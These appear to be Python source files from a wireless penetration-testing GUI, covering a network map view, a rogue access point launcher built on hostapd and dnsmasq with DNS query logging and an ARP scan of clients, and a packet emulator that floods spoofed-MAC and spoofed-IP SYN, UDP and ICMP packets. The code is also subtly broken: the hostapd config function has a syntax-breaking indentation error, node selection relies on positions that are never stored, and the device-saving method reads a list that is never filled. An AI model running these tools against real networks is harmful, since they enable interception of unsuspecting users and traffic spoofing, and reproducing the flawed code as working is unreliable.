        graph_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Initialize Matplotlib Figure
        self.figure: Figure = Figure(figsize=(8, 6), dpi=100)
        self.ax = self.figure.add_subplot(111)
        self.ax.axis('off')  # Hide axes

        # Create a canvas to embed the Matplotlib figure
        self.canvas: FigureCanvasTkAgg = FigureCanvasTkAgg(self.figure, master=graph_frame)
        self.canvas.draw()
        self.canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)

        # Bind click event to the canvas
        self.canvas.mpl_connect("button_press_event", self.on_click)

    def load_network_data(self):
        """
        Loads network data from the CoreFramework and updates the graph visualization.
        """
        try:
            # Fetch network data from CoreFramework
            network_data = self.core_framework.get_network_data()  # Method to retrieve network info
            self.update_graph(network_data)
        except Exception as e:
            messagebox.showerror("Data Load Error", f"Failed to load network data: {e}")

    def refresh_network_map(self):
        """
        Refreshes the network map by reloading network data and updating the visualization.
        """
        self.load_network_data()

    def update_graph(self, network_data: Dict[str, Any]):
        """
        Updates the NetworkX graph based on the provided network data.

        Args:
            network_data (Dict[str, Any]): Dictionary containing network and device information.
        """
        # Clear the existing graph
        self.graph.clear()

        # Example structure of network_data:
        # {
        #     "networks": [
        #         {
        #             "SSID": "Network1",
        #             "BSSID": "00:11:22:33:44:55",
        #             "Devices": [
        #                 {"MAC": "AA:BB:CC:DD:EE:FF", "IP": "192.168.1.2", "Hostname": "Device1"},
        #                 ...
        #             ]
        #         },
        #         ...
        #     ]
        # }

        networks = network_data.get("networks", [])
        for network in networks:
            ssid = network.get("SSID")
            bssid = network.get("BSSID")
            if ssid and bssid:
                # Add network node
                self.graph.add_node(bssid, label=ssid, type='network')

                devices = network.get("Devices", [])
                for device in devices:
                    mac = device.get("MAC")
                    ip = device.get("IP")
                    hostname = device.get("Hostname", "Unknown")
                    if mac:
                        # Add device node
                        self.graph.add_node(mac, label=f"{hostname}\n{ip}", type='device')
                        # Connect device to network
                        self.graph.add_edge(bssid, mac)

        # Draw the updated graph
        self.draw_graph()

    def draw_graph(self):
        """
        Draws the NetworkX graph on the Matplotlib figure.
        """
        self.ax.clear()
        self.ax.axis('off')  # Hide axes

        # Define node colors based on type
        node_colors = []
        for node, data in self.graph.nodes(data=True):
            if data.get('type') == 'network':
                node_colors.append('lightblue')
            elif data.get('type') == 'device':
                node_colors.append('lightgreen')
            else:
                node_colors.append('gray')

        # Define node sizes
        node_sizes = [800 if data.get('type') == 'network' else 500 for node, data in self.graph.nodes(data=True)]

        # Define labels
        labels = {node: data.get('label', node) for node, data in self.graph.nodes(data=True)}

        # Compute layout
        pos = nx.spring_layout(self.graph, k=0.5, iterations=50)

        # Draw nodes
        nx.draw_networkx_nodes(self.graph, pos, node_size=node_sizes, node_color=node_colors, ax=self.ax)

        # Draw edges
        nx.draw_networkx_edges(self.graph, pos, ax=self.ax)

        # Draw labels
        nx.draw_networkx_labels(self.graph, pos, labels, font_size=8, ax=self.ax)

        # Refresh the canvas
        self.canvas.draw()

    def on_click(self, event):
        """
        Handles click events on the network graph.

        Args:
            event: Matplotlib event object containing event information.
        """
        # Check if the click was on a node
        if event.inaxes == self.ax:
            # Get the closest node to the click
            x_click, y_click = event.xdata, event.ydata
            closest_node = self.get_closest_node(x_click, y_click)
            if closest_node:
                self.show_node_details(closest_node)

    def get_closest_node(self, x: float, y: float) -> Optional[str]:
        """
        Finds the closest node in the graph to the given x and y coordinates.

        Args:
            x (float): X-coordinate of the click.
            y (float): Y-coordinate of the click.

        Returns:
            Optional[str]: The node identifier if a close node is found, else None.
        """
        threshold = 0.05  # Distance threshold for selecting a node
        closest_node = None
        min_distance = float('inf')

        for node, data in self.graph.nodes(data=True):
            pos = self.graph.nodes[node].get('pos', None)
            if pos is None:
                continue
            dx = x - pos[0]
            dy = y - pos[1]
            distance = dx**2 + dy**2
            if distance < min_distance and distance < threshold**2:
                min_distance = distance
                closest_node = node

        return closest_node

    def show_node_details(self, node: str):
        """
        Displays a popup window with details about the selected node.

        Args:
            node (str): The node identifier.
        """
        node_data = self.graph.nodes[node]
        label = node_data.get('label', 'N/A')
        node_type = node_data.get('type', 'Unknown')

        # Fetch additional details if available
        details = ""
        if node_type == 'network':
            details += f"Network SSID: {label}\n"
            details += f"BSSID: {node}\n"
            # Add more network-specific details if available
        elif node_type == 'device':
            details += f"Device Name: {label.splitlines()[0]}\n"
            details += f"IP Address: {label.splitlines()[1] if len(label.splitlines()) > 1 else 'N/A'}\n"
            details += f"MAC Address: {node}\n"
            # Add more device-specific details if available

        # Create a popup window
        popup = tk.Toplevel(self)
        popup.title(f"Details for {node}")
        popup.geometry("300x200")
        ttk.Label(popup, text=f"Node: {node}", font=("Helvetica", 12, "bold")).pack(pady=10)
        ttk.Label(popup, text=details, justify='left').pack(padx=10, pady=10)
        ttk.Button(popup, text="Close", command=popup.destroy).pack(pady=10)

        # Make the popup modal
        popup.transient(self)
        popup.grab_set()
        self.wait_window(popup)


# ui/base_frame.py

"""
BaseFrame Module

This module defines the BaseFrame class, a subclass of ttk.Frame, which serves as a base
for all other frames in the WirelessPenTestLib GUI. It provides common functionalities
and a consistent structure for derived frames.

** Important Note:**
Creating rogue access points and performing network penetration testing should only be done
with explicit permission on networks you own or have authorization to test. Unauthorized
access to networks is illegal and unethical.
"""

import tkinter as tk
from tkinter import ttk
from typing import Any


class BaseFrame(ttk.Frame):
    """
    BaseFrame class serving as the parent for all other frames in the GUI.

    Attributes:
        parent (ttk.Widget): The parent widget.
    """

    def __init__(self, parent: ttk.Widget, *args, **kwargs):
        """
        Initializes the BaseFrame.

        Args:
            parent (ttk.Widget): The parent widget.
            *args: Variable length argument list.
            **kwargs: Arbitrary keyword arguments.
        """
        super().__init__(parent, *args, **kwargs)
        self.parent = parent


# ui/frames/rogue_access_point.py
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from tkinter import StringVar, Text, Scrollbar, END, VERTICAL, HORIZONTAL, N, S, E, W

import threading
import time
import subprocess
import re
import os
import sys
from scapy.all import srp
from scapy.layers.l2 import ARP, Ether


# Assuming BaseFrame is a subclass of ttk.Frame
class BaseFrame(ttk.Frame):
    def __init__(self, parent, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)


class FakeAccessPoint(BaseFrame):
    """
    Frame for creating and managing a fake (rogue) access point and monitoring connected devices.
    """
    def __init__(self, parent):
        """
        Initializes the FakeAccessPoint.
        """
        super().__init__(parent)
        self.parent = parent
        self.pack(fill=tk.BOTH, expand=True)

        # Initialize variables
        self.ap_running = False
        self.monitor_thread = None
        self.scan_thread = None
        self.stop_event = threading.Event()

        # Path to hostapd and dnsmasq configuration files
        self.hostapd_conf_path = "/tmp/hostapd.conf"
        self.dnsmasq_conf_path = "/tmp/dnsmasq.conf"

        # Wireless interface (default)
        self.interface = "wlan0"

        # List to store connected devices
        self.connected_devices = []

        # Create GUI components
        self.create_widgets()

    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        # Configuration Frame
        config_frame = ttk.LabelFrame(self, text="Access Point Configuration")
        config_frame.pack(fill=tk.X, padx=10, pady=5)

        # SSID
        ttk.Label(config_frame, text="SSID:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.E)
        self.ssid_var = StringVar()
        self.ssid_entry = ttk.Entry(config_frame, textvariable=self.ssid_var)
        self.ssid_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        self.ssid_entry.insert(0, "TestAP")

        # Channel
        ttk.Label(config_frame, text="Channel:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.E)
        self.channel_var = StringVar()
        self.channel_entry = ttk.Entry(config_frame, textvariable=self.channel_var)
        self.channel_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        self.channel_entry.insert(0, "6")

        # Interface
        ttk.Label(config_frame, text="Interface:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.E)
        self.interface_var = StringVar()
        self.interface_entry = ttk.Entry(config_frame, textvariable=self.interface_var)
        self.interface_entry.grid(row=2, column=1, padx=5, pady=5, sticky=tk.W)
        self.interface_entry.insert(0, self.interface)

        # Security
        ttk.Label(config_frame, text="Security:").grid(row=3, column=0, padx=5, pady=5, sticky=tk.E)
        self.security_var = StringVar()
        self.security_combo = ttk.Combobox(config_frame, textvariable=self.security_var, state="readonly")
        self.security_combo['values'] = ("Open", "WPA/WPA2")
        self.security_combo.current(0)
        self.security_combo.grid(row=3, column=1, padx=5, pady=5, sticky=tk.W)
        self.security_combo.bind("<<ComboboxSelected>>", self.toggle_password)

        # Password
        ttk.Label(config_frame, text="Password:").grid(row=4, column=0, padx=5, pady=5, sticky=tk.E)
        self.password_var = StringVar()
        self.password_entry = ttk.Entry(config_frame, textvariable=self.password_var, show="*")
        self.password_entry.grid(row=4, column=1, padx=5, pady=5, sticky=tk.W)
        self.password_entry.configure(state='disabled')

        # Buttons Frame
        buttons_frame = ttk.Frame(self)
        buttons_frame.pack(fill=tk.X, padx=10, pady=5)

        # Start AP Button
        self.start_ap_button = ttk.Button(buttons_frame, text="Start AP", command=self.start_ap)
        self.start_ap_button.pack(side=tk.LEFT, padx=5)

        # Stop AP Button
        self.stop_ap_button = ttk.Button(buttons_frame, text="Stop AP", command=self.stop_ap, state=tk.DISABLED)
        self.stop_ap_button.pack(side=tk.LEFT, padx=5)

        # Refresh Devices Button
        self.refresh_button = ttk.Button(buttons_frame, text="Refresh Devices", command=self.refresh_devices, state=tk.DISABLED)
        self.refresh_button.pack(side=tk.LEFT, padx=5)

        # Devices Frame
        devices_frame = ttk.LabelFrame(self, text="Connected Devices")
        devices_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Treeview for devices
        columns = ("MAC Address", "IP Address", "Signal Strength")
        self.devices_tree = ttk.Treeview(devices_frame, columns=columns, show="headings")
        for col in columns:
            self.devices_tree.heading(col, text=col)
            self.devices_tree.column(col, anchor=tk.W, stretch=True)
        self.devices_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        # Scrollbar for Treeview
        devices_vsb = ttk.Scrollbar(devices_frame, orient=VERTICAL, command=self.devices_tree.yview)
        self.devices_tree.configure(yscroll=devices_vsb.set)
        devices_vsb.pack(side=tk.RIGHT, fill=tk.Y)

    def toggle_password(self, event):
        """
        Enables or disables the password entry based on selected security.
        """
        if self.security_var.get() == "WPA/WPA2":
            self.password_entry.configure(state='normal')
        else:
            self.password_entry.configure(state='disabled')
            self.password_var.set("")

    def start_ap(self):
        """
        Starts the rogue access point.
        """
        ssid = self.ssid_var.get().strip()
        channel = self.channel_var.get().strip()
        interface = self.interface_var.get().strip()
        security = self.security_var.get().strip()
        password = self.password_var.get().strip()

        # Validate inputs
        if not ssid:
            messagebox.showerror("Input Error", "SSID is required.")
            return
        if not channel.isdigit() or not (1 <= int(channel) <= 14):
            messagebox.showerror("Input Error", "Channel must be a number between 1 and 14.")
            return
        if not self.validate_interface(interface):
            messagebox.showerror("Input Error", f"Interface '{interface}' is not valid or not up.")
            return
        if security == "WPA/WPA2" and not password:
            messagebox.showerror("Input Error", "Password is required for WPA/WPA2 security.")
            return
        if security == "WPA/WPA2" and len(password) < 8:
            messagebox.showerror("Input Error", "Password must be at least 8 characters long.")
            return

        # Generate hostapd configuration
        try:
            self.generate_hostapd_conf(ssid, channel, interface, security, password)
        except Exception as e:
            messagebox.showerror("Configuration Error", f"Failed to generate hostapd configuration:\n{e}")
            return

        # Start hostapd
        try:
            self.hostapd_process = subprocess.Popen(['hostapd', self.hostapd_conf_path],
                                                    stdout=subprocess.PIPE,
                                                    stderr=subprocess.PIPE)
        except FileNotFoundError:
            messagebox.showerror("hostapd Not Found", "hostapd is not installed or not found in PATH.")
            return
        except Exception as e:
            messagebox.showerror("hostapd Error", f"Failed to start hostapd:\n{e}")
            return

        # Start dnsmasq for DHCP (optional)
        try:
            self.generate_dnsmasq_conf(interface)
            self.dnsmasq_process = subprocess.Popen(['dnsmasq', '-C', self.dnsmasq_conf_path, '-d'],
                                                   stdout=subprocess.PIPE,
                                                   stderr=subprocess.PIPE)
        except FileNotFoundError:
            messagebox.showerror("dnsmasq Not Found", "dnsmasq is not installed or not found in PATH.")
            self.hostapd_process.terminate()
            return
        except Exception as e:
            messagebox.showerror("dnsmasq Error", f"Failed to start dnsmasq:\n{e}")
            self.hostapd_process.terminate()
            return

        self.ap_running = True
        self.start_ap_button.config(state=tk.DISABLED)
        self.stop_ap_button.config(state=tk.NORMAL)
        self.refresh_button.config(state=tk.NORMAL)

        # Start monitoring connected devices
        self.monitor_thread = threading.Thread(target=self.monitor_devices, daemon=True)
        self.monitor_thread.start()

        messagebox.showinfo("AP Started", f"Rogue Access Point '{ssid}' has been started on channel {channel}.")

    def stop_ap(self):
        """
        Stops the rogue access point.
        """
        if self.ap_running:
            # Terminate hostapd
            self.hostapd_process.terminate()
            self.hostapd_process.wait()

            # Terminate dnsmasq
            self.dnsmasq_process.terminate()
            self.dnsmasq_process.wait()

            # Remove temporary configuration files
            try:
                os.remove(self.hostapd_conf_path)
                os.remove(self.dnsmasq_conf_path)
            except Exception:
                pass

            # Stop device monitoring
            self.ap_running = False
            self.stop_event.set()
            if self.monitor_thread.is_alive():
                self.monitor_thread.join()

            # Clear devices list
            self.connected_devices.clear()
            self.devices_tree.delete(*self.devices_tree.get_children())

            self.start_ap_button.config(state=tk.NORMAL)
            self.stop_ap_button.config(state=tk.DISABLED)
            self.refresh_button.config(state=tk.DISABLED)

            messagebox.showinfo("AP Stopped", "Rogue Access Point has been stopped.")
        else:
            messagebox.showwarning("Not Running", "Access Point is not running.")

    def generate_hostapd_conf(self, ssid, channel, interface, security, password):
        """
        Generates the hostapd configuration file.
        """
        config = f"""
            interface={interface}
            driver=nl80211
            ssid={ssid}
            channel={channel}
            hw_mode=g
            ieee80211n=1
            wmm_enabled=1
                    """

                    if security == "WPA/WPA2":
                        config += f"""
            wpa=2
            wpa_passphrase={password}
            wpa_key_mgmt=WPA-PSK
            rsn_pairwise=CCMP
                        """
                    else:
                        config += """
            auth_algs=1
                """

        with open(f"{self.hostapd_conf_path}", 'w') as f:
            f.write(config)

    def generate_dnsmasq_conf(self, interface):
        """
        Generates the dnsmasq configuration file for DHCP services.
        """
        config = f"""
            interface={interface}
            dhcp-range=192.168.10.10,192.168.10.50,12h
            dhcp-option=3,192.168.10.1
            dhcp-option=6,192.168.10.1
            server=8.8.8.8
            log-queries
            log-dhcp
        """

        with open(self.dnsmasq_conf_path, 'w') as f:
            f.write(config)

    def validate_interface(self, interface):
        """
        Validates if the wireless interface exists and is up.
        """
        try:
            output = subprocess.check_output(['iwconfig', interface], stderr=subprocess.STDOUT).decode()
            if "no wireless extensions" in output.lower():
                return False
            return True
        except subprocess.CalledProcessError:
            return False

    def monitor_devices(self):
        """
        Monitors connected devices by periodically scanning the network.
        """
        while self.ap_running and not self.stop_event.is_set():
            devices = self.scan_connected_devices()
            self.update_device_list(devices)
            time.sleep(5)  # Adjust the scan interval as needed

    def scan_connected_devices(self):
        """
        Scans the network for connected devices using ARP.
        """
        # Assuming the AP is on 192.168.10.0/24
        target_ip = "192.168.10.0/24"

        # Construct ARP request
        arp = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=3, verbose=0)[0]

        devices = []
        for sent, received in result:
            devices.append({'mac': received.hwsrc, 'ip': received.psrc, 'signal': "N/A"})  # Signal strength can be added if available

        return devices

    def update_device_list(self, devices):
        """
        Updates the Treeview with the list of connected devices.
        """
        # Clear existing entries
        self.devices_tree.delete(*self.devices_tree.get_children())

        for device in devices:
            self.devices_tree.insert("", "end", values=(
                device['mac'],
                device['ip'],
                device['signal']
            ))

    def refresh_devices(self):
        """
        Manually refreshes the list of connected devices.
        """
        if self.ap_running:
            devices = self.scan_connected_devices()
            self.update_device_list(devices)
        else:
            messagebox.showwarning("AP Not Running", "Access Point is not running.")

    def save_devices(self):
        """
        Saves the list of connected devices to a file.
        """
        if not self.connected_devices:
            messagebox.showwarning("No Devices", "There are no connected devices to save.")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )

        if file_path:
            try:
                with open(file_path, 'w') as f:
                    for device in self.connected_devices:
                        f.write(f"MAC Address: {device['mac']}\n")
                        f.write(f"IP Address: {device['ip']}\n")
                        f.write(f"Signal Strength: {device['signal']}\n")
                        f.write("\n")
                messagebox.showinfo("Success", f"Connected devices saved to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save devices:\n{e}")

    # Additional methods like view_device_info, export_device_info can be implemented here if needed


# Example usage within a Tkinter application
def main():
    root = tk.Tk()
    root.title("Network Testing Tool")
    root.geometry("800x600")

    # Create a Notebook (tabbed interface)
    notebook = ttk.Notebook(root)
    notebook.pack(fill=tk.BOTH, expand=True)

    # Add FakeAccessPoint tab
    fake_access_point = FakeAccessPoint(notebook)
    notebook.add(fake_access_point, text="Fake Access Point")

    root.mainloop()


if __name__ == "__main__":
    if os.geteuid() != 0:
        messagebox.showerror("Permission Denied", "Please run this script with sudo or as root.")
        sys.exit(1)
    main()


# ui/frames/test_devices.py
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from tkinter import StringVar, Text, Scrollbar, END, VERTICAL, HORIZONTAL, N, S, E, W

from scapy.all import send
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether
import threading
import time
import queue
import re


# Assuming BaseFrame is a subclass of ttk.Frame
class BaseFrame(ttk.Frame):
    def __init__(self, parent, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)


class FakeDeviceManager(BaseFrame):
    """
    Frame for creating and managing fake test devices for network testing purposes.
    """
    def __init__(self, parent):
        """
        Initializes the FakeDeviceManager.
        """
        super().__init__(parent)
        self.parent = parent
        self.pack(fill=tk.BOTH, expand=True)

        # Initialize variables
        self.fake_devices = {}
        self.device_queue = queue.Queue()

        # Create GUI components
        self.create_widgets()

    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        # Input Frame
        input_frame = ttk.LabelFrame(self, text="Create Fake Device")
        input_frame.pack(fill=tk.X, padx=10, pady=5)

        # Device Name
        ttk.Label(input_frame, text="Device Name:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.E)
        self.device_name_var = StringVar()
        self.device_name_entry = ttk.Entry(input_frame, textvariable=self.device_name_var)
        self.device_name_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)

        # MAC Address
        ttk.Label(input_frame, text="MAC Address:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.E)
        self.mac_address_var = StringVar()
        self.mac_address_entry = ttk.Entry(input_frame, textvariable=self.mac_address_var)
        self.mac_address_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        self.mac_address_entry.insert(0, "00:11:22:33:44:55")  # Default MAC

        # IP Address
        ttk.Label(input_frame, text="IP Address:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.E)
        self.ip_address_var = StringVar()
        self.ip_address_entry = ttk.Entry(input_frame, textvariable=self.ip_address_var)
        self.ip_address_entry.grid(row=2, column=1, padx=5, pady=5, sticky=tk.W)
        self.ip_address_entry.insert(0, "192.168.1.100")  # Default IP

        # Protocol
        ttk.Label(input_frame, text="Protocol:").grid(row=3, column=0, padx=5, pady=5, sticky=tk.E)
        self.protocol_var = StringVar()
        self.protocol_combo = ttk.Combobox(input_frame, textvariable=self.protocol_var, state="readonly")
        self.protocol_combo['values'] = ("TCP", "UDP", "ICMP")
        self.protocol_combo.current(0)
        self.protocol_combo.grid(row=3, column=1, padx=5, pady=5, sticky=tk.W)

        # Destination IP
        ttk.Label(input_frame, text="Destination IP:").grid(row=4, column=0, padx=5, pady=5, sticky=tk.E)
        self.dest_ip_var = StringVar()
        self.dest_ip_entry = ttk.Entry(input_frame, textvariable=self.dest_ip_var)
        self.dest_ip_entry.grid(row=4, column=1, padx=5, pady=5, sticky=tk.W)
        self.dest_ip_entry.insert(0, "192.168.1.1")  # Default Destination IP

        # Destination Port (for TCP/UDP)
        ttk.Label(input_frame, text="Destination Port:").grid(row=5, column=0, padx=5, pady=5, sticky=tk.E)
        self.dest_port_var = StringVar()
        self.dest_port_entry = ttk.Entry(input_frame, textvariable=self.dest_port_var)
        self.dest_port_entry.grid(row=5, column=1, padx=5, pady=5, sticky=tk.W)
        self.dest_port_entry.insert(0, "80")  # Default Port

        # Create Device Button
        self.create_button = ttk.Button(input_frame, text="Add Device", command=self.add_fake_device)
        self.create_button.grid(row=6, column=0, columnspan=2, pady=10)

        # Separator
        separator = ttk.Separator(self, orient='horizontal')
        separator.pack(fill=tk.X, padx=10, pady=10)

        # Devices Frame
        devices_frame = ttk.LabelFrame(self, text="Fake Devices")
        devices_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Treeview for devices
        columns = ("Device Name", "MAC Address", "IP Address", "Protocol", "Destination IP", "Destination Port", "Status")
        self.devices_tree = ttk.Treeview(devices_frame, columns=columns, show="headings", selectmode="browse")
        for col in columns:
            self.devices_tree.heading(col, text=col)
            self.devices_tree.column(col, anchor=tk.W, stretch=True)
        self.devices_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        # Scrollbars for Treeview
        devices_vsb = ttk.Scrollbar(devices_frame, orient=VERTICAL, command=self.devices_tree.yview)
        self.devices_tree.configure(yscroll=devices_vsb.set)
        devices_vsb.pack(side=tk.RIGHT, fill=tk.Y)

        # Buttons Frame
        buttons_frame = ttk.Frame(self)
        buttons_frame.pack(fill=tk.X, padx=10, pady=5)

        # Start Emulation Button
        self.start_emulation_button = ttk.Button(buttons_frame, text="Start Emulation", command=self.start_emulation)
        self.start_emulation_button.pack(side=tk.LEFT, padx=5)

        # Stop Emulation Button
        self.stop_emulation_button = ttk.Button(buttons_frame, text="Stop Emulation", command=self.stop_emulation, state=tk.DISABLED)
        self.stop_emulation_button.pack(side=tk.LEFT, padx=5)

        # Remove Device Button
        self.remove_button = ttk.Button(buttons_frame, text="Remove Device", command=self.remove_fake_device)
        self.remove_button.pack(side=tk.LEFT, padx=5)

    def validate_mac(self, mac):
        """
        Validates MAC address format.
        """
        if re.match("[0-9a-fA-F]{2}([-:])[0-9a-fA-F]{2}(\\1[0-9a-fA-F]{2}){4}$", mac):
            return True
        return False

    def validate_ip(self, ip):
        """
        Validates IP address format.
        """
        parts = ip.split(".")
        if len(parts) != 4:
            return False
        for item in parts:
            if not item.isdigit():
                return False
            num = int(item)
            if num < 0 or num > 255:
                return False
        return True

    def add_fake_device(self):
        """
        Adds a new fake device based on input fields.
        """
        device_name = self.device_name_var.get().strip()
        mac_address = self.mac_address_var.get().strip()
        ip_address = self.ip_address_var.get().strip()
        protocol = self.protocol_var.get().strip().upper()
        dest_ip = self.dest_ip_var.get().strip()
        dest_port = self.dest_port_var.get().strip()

        # Validate inputs
        if not device_name:
            messagebox.showerror("Input Error", "Device Name is required.")
            return

        if not self.validate_mac(mac_address):
            messagebox.showerror("Input Error", "Invalid MAC Address format.")
            return

        if not self.validate_ip(ip_address):
            messagebox.showerror("Input Error", "Invalid IP Address format.")
            return

        if protocol not in ("TCP", "UDP", "ICMP"):
            messagebox.showerror("Input Error", "Protocol must be TCP, UDP, or ICMP.")
            return

        if not self.validate_ip(dest_ip):
            messagebox.showerror("Input Error", "Invalid Destination IP Address format.")
            return

        if protocol in ("TCP", "UDP"):
            if not dest_port.isdigit() or not (0 < int(dest_port) < 65536):
                messagebox.showerror("Input Error", "Destination Port must be a number between 1 and 65535.")
                return
            dest_port = int(dest_port)
        else:
            dest_port = "N/A"

        if device_name in self.fake_devices:
            messagebox.showerror("Duplicate Device", "A device with this name already exists.")
            return

        # Add device to Treeview
        status = "Stopped"
        self.devices_tree.insert("", "end", iid=device_name, values=(
            device_name,
            mac_address,
            ip_address,
            protocol,
            dest_ip,
            dest_port,
            status
        ))

        # Store device information
        self.fake_devices[device_name] = {
            'mac': mac_address,
            'ip': ip_address,
            'protocol': protocol,
            'dest_ip': dest_ip,
            'dest_port': dest_port,
            'status': status,
            'thread': None,
            'stop_event': None
        }

        # Clear input fields
        self.device_name_var.set("")
        self.mac_address_var.set("00:11:22:33:44:55")
        self.ip_address_var.set("192.168.1.100")
        self.protocol_combo.current(0)
        self.dest_ip_var.set("192.168.1.1")
        self.dest_port_var.set("80")

    def remove_fake_device(self):
        """
        Removes the selected fake device.
        """
        selected = self.devices_tree.selection()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a device to remove.")
            return

        device_name = selected[0]
        device_info = self.fake_devices.get(device_name)

        if device_info and device_info['status'] == "Running":
            messagebox.showwarning("Device Running", "Stop the device before removing it.")
            return

        # Remove from Treeview and dictionary
        self.devices_tree.delete(device_name)
        del self.fake_devices[device_name]

    def start_emulation(self):
        """
        Starts packet emulation for the selected fake device.
        """
        selected = self.devices_tree.selection()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a device to start emulation.")
            return

        device_name = selected[0]
        device_info = self.fake_devices.get(device_name)

        if device_info['status'] == "Running":
            messagebox.showwarning("Already Running", "Emulation is already running for this device.")
            return

        # Create a stop event
        stop_event = threading.Event()
        device_info['stop_event'] = stop_event

        # Start the emulation thread
        emulation_thread = threading.Thread(target=self.emulate_device, args=(device_name, stop_event), daemon=True)
        device_info['thread'] = emulation_thread
        emulation_thread.start()

        # Update status
        device_info['status'] = "Running"
        self.devices_tree.set(device_name, "Status", "Running")

        # Enable Stop button
        self.stop_emulation_button.config(state=tk.NORMAL)

    def stop_emulation(self):
        """
        Stops packet emulation for the selected fake device.
        """
        selected = self.devices_tree.selection()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a device to stop emulation.")
            return

        device_name = selected[0]
        device_info = self.fake_devices.get(device_name)

        if device_info['status'] != "Running":
            messagebox.showwarning("Not Running", "Emulation is not running for this device.")
            return

        # Signal the thread to stop
        device_info['stop_event'].set()
        device_info['thread'].join()

        # Update status
        device_info['status'] = "Stopped"
        self.devices_tree.set(device_name, "Status", "Stopped")

        # Disable Stop button if no devices are running
        any_running = any(info['status'] == "Running" for info in self.fake_devices.values())
        if not any_running:
            self.stop_emulation_button.config(state=tk.DISABLED)

    def emulate_device(self, device_name, stop_event):
        """
        Sends crafted packets based on the device's configuration until stopped.
        """
        device_info = self.fake_devices.get(device_name)
        if not device_info:
            return

        mac = device_info['mac']
        ip = device_info['ip']
        protocol = device_info['protocol']
        dest_ip = device_info['dest_ip']
        dest_port = device_info['dest_port']

        while not stop_event.is_set():
            try:
                if protocol == "TCP":
                    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src=ip, dst=dest_ip) / TCP(dport=dest_port, flags="S")
                elif protocol == "UDP":
                    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src=ip, dst=dest_ip) / UDP(dport=dest_port)
                elif protocol == "ICMP":
                    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src=ip, dst=dest_ip) / ICMP()
                else:
                    continue  # Unsupported protocol

                send(pkt, verbose=False)
                time.sleep(1)  # Adjust the frequency as needed
            except Exception as e:
                messagebox.showerror("Emulation Error", f"Error in emulating device {device_name}:\n{e}")
                break

    # Additional methods can be implemented here if needed


# Example usage within a Tkinter application
def main():
    root = tk.Tk()
    root.title("Network Testing Tool")
    root.geometry("1200x800")

    # Create a Notebook (tabbed interface)
    notebook = ttk.Notebook(root)
    notebook.pack(fill=tk.BOTH, expand=True)

    # Add LivePacketMonitor tab
    # Assuming LivePacketMonitor is implemented as per your previous code
    from tkinter import ttk  # Re-import in case it's needed
    class LivePacketMonitor(BaseFrame):
        """
        Placeholder for LivePacketMonitor implementation.
        Replace this with your actual implementation.
        """
        def __init__(self, parent):
            super().__init__(parent)
            label = ttk.Label(self, text="Live Packet Monitor - To Be Implemented")
            label.pack(padx=10, pady=10)

    live_packet_monitor = LivePacketMonitor(notebook)
    notebook.add(live_packet_monitor, text="Live Packet Monitor")

    # Add FakeDeviceManager tab
    fake_device_manager = FakeDeviceManager(notebook)
    notebook.add(fake_device_manager, text="Fake Device Manager")

    root.mainloop()


if __name__ == "__main__":
    main()


# ui/frames/__init__.py


# vulnerabilities/__init__.py


